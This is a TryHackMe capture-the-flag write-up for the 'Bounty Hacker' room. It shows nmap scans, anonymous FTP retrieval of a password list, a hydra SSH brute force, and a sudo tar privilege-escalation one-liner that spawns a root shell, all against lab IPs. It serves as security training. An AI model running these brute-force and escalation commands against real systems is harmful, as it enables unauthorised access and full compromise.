---
title: "Bounty Hacker"
date: 2025-01-22
image: /assets/img/tryhackme/BountyHacker/BountyHacker_image.jpg
description: Writeup of the TryHackMe-CTF Bounty Hunter
categories: [Tryhackme, Easy]
tags: [linux, web, ssh, hydra, bruteforce, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Bounty Hacker</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/cowboyhacker">https://tryhackme.com/r/room/cowboyhacker</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution to the CTF challenge Bounty Hacker

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap 10.10.66.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 04:25 EST
Nmap scan report for 10.10.66.27
Host is up (0.040s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds
```
and enumerated the services nmap found in more depth using the `-A` flag:
```bash
$ nmap -A -p 21,22,80 10.10.66.27
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 04:27 EST
Nmap scan report for 10.10.66.27
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.21.63.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.20 seconds
```
from here I analyzed the services one after another.

## FTP Analysis
As we can see in the nmap output the ftp server allow anonymous access. Therefore I trief to access the service:

```bash
$ ftp anonymous@10.10.59.122
Connected to 10.10.59.122.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14671|)
```
It took me a while to actually see the files because of many timeouts. Thats why I switched to Filezilla which automatically try to reconnect. After some time I was able to download the following files:
```bash
$ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

$ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
As we can see we got a potential username and probably a password list.

## HTTP Analysis
I analyzed the source code, performed enumeration and tried steganography techniques on all the images without getting anything.

## SSH Analysis
With the given username and the potential password list, I tried to brute force the ssh login using `hydra`
```bash
$ hydra -l lin -P locks.txt ssh://10.10.59.122
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 04:43:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.59.122:22/
[22][ssh] host: 10.10.59.122   login: lin   password: [removed]
```
Hydra found a valid credentails, which allowed me to login in and retrieve the user flag.
```bash
$ ssh lin@10.10.59.122
lin@bountyhacker:~/Desktop$ hostname
bountyhacker
lin@bountyhacker:~/Desktop$ cat user.txt
THM{*** removed ***}
```
## Privilege Escalation
For the root flag we need to escalate our privileges. I hab success by executing `sudo -l`
```bash
$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
A quick search in <a href="https://gtfobins.github.io/gtfobins/tar/#shell">gftobins</a> gave me all I needed:
```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# cd /root
# cat root.txt
THM{*** removed ***}
```

solved! :)
